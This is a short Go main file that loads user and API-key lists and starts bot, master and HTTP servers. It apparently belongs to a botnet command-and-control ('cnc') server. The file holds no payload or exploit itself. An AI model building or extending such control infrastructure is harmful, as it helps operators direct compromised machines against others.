package main

import (
	"cnc/lib/api"
	//"cnc/lib/grafana"
	"cnc/lib/socket"
	"cnc/lib/utils"
)

func LoadUsers() {
	u, err := utils.ReadLines("data/users.csv")
	utils.HandleError(err)
	utils.Users = u

	k, err := utils.ReadLines("data/api_key.csv")
	utils.HandleError(err)
	utils.ApiKeys = k
}

func main() {
	LoadUsers()
	
	go socket.StartBotServer()
	go socket.StartMasterServer()
	go api.ListenPrivateHttpServer()
	go api.ListenPublicHttpServer()
	//go grafana.StartPrometheus()

	select {}
}
